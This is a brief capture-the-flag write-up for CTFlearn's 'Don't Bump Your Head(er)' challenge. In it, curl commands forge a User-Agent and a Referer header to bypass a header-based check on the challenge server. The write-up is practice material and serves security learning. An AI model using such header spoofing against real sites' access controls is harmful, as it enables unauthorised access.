[Don't Bump Your Head(er) ](https://ctflearn.com/challenge/109)

# Description

Try to bypass my security measure on this site! `http://165.227.106.113/header.php`

# Solution

Add the header using curl

```sh
curl -H "User-Agent: Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php
```

output will be
`Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
`
Set the reference to `awesomesauce.com`

```sh
 curl -H "User-Agent: Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php -H "Referer: awesomesauce.com"
```
